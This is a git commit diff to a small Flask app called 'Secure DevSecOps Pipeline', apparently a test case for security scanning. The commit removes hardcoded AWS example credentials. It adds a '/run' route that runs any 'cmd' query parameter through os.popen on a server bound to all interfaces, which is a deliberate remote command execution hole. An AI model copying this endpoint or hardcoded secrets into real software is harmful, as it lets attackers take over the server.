74469ef879ce5094a0d53912eec5b168770c8c7f
Srivaskumara <SRIVASKUMARA@GMAIL.COM>
2026-07-02 13:20:03 -0500

    test 2

--- app.py
+++ app.py
@@ -1,13 +1,17 @@
 from flask import Flask 
-
-AWS_ACCESS_KEY="AKIAIOSFODNN7EXAMPLE"
-AWS_SECRET_ACCESS_KEY="wJaIrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+import os 
 
 app = Flask(__name__)
 
 @app.route("/")
 def home():
     return "Secure DevSecOps Pipeline is running!"
+
+@app.route("/run")
+def run_command():
+    cmd=request.args.get("cmd")
+    return os.popen(cmd).read()
+
 
 if __name__== "__main__":
     app.run(host="0.0.0.0", port=5000)
